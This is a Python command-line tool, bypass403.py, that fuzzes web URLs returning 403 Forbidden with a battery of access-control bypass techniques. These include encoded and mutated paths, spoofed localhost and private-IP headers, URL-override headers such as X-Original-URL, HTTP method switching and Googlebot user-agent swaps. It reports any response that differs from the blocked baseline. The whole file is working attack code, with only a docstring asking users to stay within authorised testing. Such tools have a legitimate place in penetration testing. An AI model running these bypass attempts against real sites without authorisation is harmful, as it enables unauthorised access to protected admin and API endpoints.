#!/usr/bin/env python3
"""
bypass403.py — 403 bypass technique fuzzer
Author: Ritesh Thorve

Takes one or more URLs that returned 403 and throws a full battery of
known bypass techniques at each: path mutations, spoofed-IP headers,
override headers, method overrides, encoding tricks, and case
variations. Flags anything that comes back with a non-403/401 status
and a body that looks different from the baseline 403 response (to
cut down on false positives from custom error pages that return 200).

Usage:
    python3 bypass403.py -u https://api.example.com/admin
    python3 bypass403.py -l urls.txt -o results.json
    python3 bypass403.py -u https://api.example.com/admin -H "Authorization: Bearer xxx"

Only run this against targets you're authorized to test.
"""

import argparse
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlsplit, urlunsplit

import requests
from requests.exceptions import RequestException

requests.packages.urllib3.disable_warnings()

SPOOF_IPS = ["127.0.0.1", "localhost", "10.0.0.1", "172.16.0.1", "192.168.0.1", "0.0.0.0"]

SPOOF_HEADERS = [
    "X-Forwarded-For", "X-Forwarded", "Forwarded-For", "X-Remote-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Real-IP", "X-Originating-IP",
    "X-Host", "X-Forwarded-Host", "X-ProxyUser-Ip", "True-Client-IP",
    "CF-Connecting-IP", "X-Forwarded-Server",
]

MISC_HEADERS = [
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Original-URL", None),      # filled in with path
    ("X-Rewrite-URL", None),
    ("X-Override-URL", None),
    ("X-Forwarded-Proto", "https"),
    ("X-Forwarded-Scheme", "https"),
    ("X-Forwarded-Port", "443"),
    ("X-Forwarded-SSL", "on"),
    ("Referer", None),             # filled in with base URL
    ("X-HTTP-Method-Override", "GET"),
    ("X-HTTP-Method", "GET"),
    ("X-Method-Override", "GET"),
    ("X-Requested-With", "XMLHttpRequest"),
    ("X-Forwarded-For-Original", "127.0.0.1"),
    ("X-WAP-Profile", "127.0.0.1"),
    ("Content-Length", "0"),
    ("X-Cluster-Client-IP", "127.0.0.1"),
]

METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "TRACE", "PATCH", "DELETE", "CONNECT"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/7.68.0",
]


def path_variants(path: str):
    """Generate path-mutation bypass candidates for a given path."""
    if not path.startswith("/"):
        path = "/" + path
    trimmed = path.rstrip("/")
    last_seg = trimmed.rsplit("/", 1)[-1] if trimmed else ""
    parent = trimmed.rsplit("/", 1)[0] if "/" in trimmed else ""

    variants = {
        path,
        path + "/",
        path + "/.",
        path + "//",
        path + "///",
        path + "/./",
        path + "/..",
        path + "/../",
        path + "..;/",
        path + ";/",
        path + ";foo=bar",
        path + "?",
        path + "??",
        path + "#",
        path + "%20",
        path + "%09",
        path + "%0a",
        path + "%00",
        path + "%2500",
        path + ".json",
        path + ".html",
        path + ".",
        path + "..",
        path.upper(),
        path.lower(),
        "//" + path.lstrip("/"),
        "/./" + path.lstrip("/"),
        "/%2e" + path,
        "/%2e%2e" + path,
        "/%2f" + path.lstrip("/"),
        "/%252f" + path.lstrip("/"),
        path.replace("/", "/%2e/"),
        "/" + last_seg + "/..%2f" + last_seg if last_seg else path,
        "/" + last_seg + "/..%252f" + last_seg if last_seg else path,
        parent + "/" + last_seg + "%20" if last_seg else path,
        parent + "/" + last_seg + "%09" if last_seg else path,
        parent + "/" + last_seg + "%2e" if last_seg else path,
        parent + "//" + last_seg if last_seg else path,
        parent + "/./" + last_seg if last_seg else path,
        parent + "/" + last_seg.upper() if last_seg else path,
        parent + "/./" + last_seg + "/." if last_seg else path,
        parent + "//" + last_seg + "//" if last_seg else path,
        "/" + last_seg,  # sometimes just re-requesting last segment from root works
    }
    # case-scramble first letter of last segment
    if last_seg:
        variants.add(parent + "/" + last_seg[0].upper() + last_seg[1:])
        variants.add(parent + "/" + last_seg[0].lower() + last_seg[1:])
    return sorted(v for v in variants if v)


def build_requests(base_url: str, extra_headers: dict):
    """Yield (label, method, url, headers) tuples to try."""
    parts = urlsplit(base_url)
    path = parts.path or "/"
    base_root = urlunsplit((parts.scheme, parts.netloc, "", "", ""))

    jobs = []

    # 1. Path mutations, default GET, default headers
    for variant in path_variants(path):
        url = urlunsplit((parts.scheme, parts.netloc, variant, parts.query, ""))
        jobs.append((f"path:{variant}", "GET", url, dict(extra_headers)))

    # 2. Spoofed IP headers against the original path
    for header in SPOOF_HEADERS:
        for ip in SPOOF_IPS[:3]:  # keep it reasonable per header
            h = dict(extra_headers)
            h[header] = ip
            jobs.append((f"header:{header}={ip}", "GET", base_url, h))

    # 3. Misc override headers
    for name, val in MISC_HEADERS:
        h = dict(extra_headers)
        if val is None:
            if "URL" in name:
                h[name] = path
            elif name == "Referer":
                h[name] = base_root + "/"
            else:
                h[name] = "GET"
        else:
            h[name] = val
        jobs.append((f"header:{name}", "GET", base_url, h))

    # 4. Method switching
    for method in METHODS:
        jobs.append((f"method:{method}", method, base_url, dict(extra_headers)))

    # 5. User-agent swaps
    for ua in USER_AGENTS:
        h = dict(extra_headers)
        h["User-Agent"] = ua
        jobs.append((f"ua:{ua[:20]}", "GET", base_url, h))

    return jobs


def get_baseline(session, url, timeout):
    """Fetch the plain 403 response to compare bodies against later."""
    try:
        r = session.get(url, timeout=timeout, verify=False, allow_redirects=False)
        return r.status_code, len(r.content)
    except RequestException:
        return None, None


def try_one(session, label, method, url, headers, timeout):
    try:
        r = session.request(method, url, headers=headers, timeout=timeout,
                             verify=False, allow_redirects=False)
        return {
            "label": label,
            "method": method,
            "url": url,
            "headers": {k: v for k, v in headers.items()},
            "status": r.status_code,
            "length": len(r.content),
        }
    except RequestException as e:
        return {
            "label": label,
            "method": method,
            "url": url,
            "headers": {k: v for k, v in headers.items()},
            "status": None,
            "length": None,
            "error": str(e),
        }


def run_target(url, extra_headers, timeout, threads, delay):
    session = requests.Session()
    baseline_status, baseline_len = get_baseline(session, url, timeout)

    jobs = build_requests(url, extra_headers)
    results = []

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {
            pool.submit(try_one, session, label, method, u, h, timeout): label
            for label, method, u, h in jobs
        }
        for fut in as_completed(futures):
            res = fut.result()
            results.append(res)
            if delay:
                time.sleep(delay)

    interesting = [
        r for r in results
        if r.get("status") is not None
        and r["status"] not in (403, 401, 404, 400, None)
        and not (r["status"] == baseline_status and r["length"] == baseline_len)
    ]
    interesting.sort(key=lambda r: r["status"])

    return {
        "target": url,
        "baseline_status": baseline_status,
        "baseline_length": baseline_len,
        "total_attempts": len(results),
        "interesting": interesting,
        "all_results": results,
    }


def parse_extra_headers(header_list):
    headers = {}
    for h in header_list or []:
        if ":" not in h:
            continue
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()
    return headers


def main():
    ap = argparse.ArgumentParser(description="403 bypass technique fuzzer")
    ap.add_argument("-u", "--url", help="Single target URL that returned 403")
    ap.add_argument("-l", "--list", help="File with one target URL per line")
    ap.add_argument("-H", "--header", action="append", default=[],
                     help="Extra header to include on every request, e.g. -H 'Cookie: session=x'")
    ap.add_argument("-o", "--output", help="Write full JSON results to this file")
    ap.add_argument("-t", "--threads", type=int, default=10, help="Concurrent requests per target")
    ap.add_argument("--timeout", type=float, default=8.0, help="Per-request timeout in seconds")
    ap.add_argument("--delay", type=float, default=0.0, help="Delay between requests (seconds), for rate-limited targets")
    args = ap.parse_args()

    targets = []
    if args.url:
        targets.append(args.url.strip())
    if args.list:
        with open(args.list) as f:
            targets.extend(line.strip() for line in f if line.strip())

    if not targets:
        ap.error("Provide -u/--url or -l/--list")

    extra_headers = parse_extra_headers(args.header)
    all_output = []

    for target in targets:
        print(f"\n[*] Target: {target}")
        result = run_target(target, extra_headers, args.timeout, args.threads, args.delay)
        all_output.append(result)

        print(f"    baseline: {result['baseline_status']} ({result['baseline_length']} bytes)")
        print(f"    attempts: {result['total_attempts']}")

        if result["interesting"]:
            print(f"    [+] {len(result['interesting'])} potentially interesting result(s):")
            for r in result["interesting"]:
                print(f"        [{r['status']}] {r['method']:6} {r['label']:35} len={r['length']}")
        else:
            print("    [-] nothing stood out (all responses matched baseline or were 401/403/404)")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(all_output, f, indent=2)
        print(f"\n[*] Full results written to {args.output}")


if __name__ == "__main__":
    main()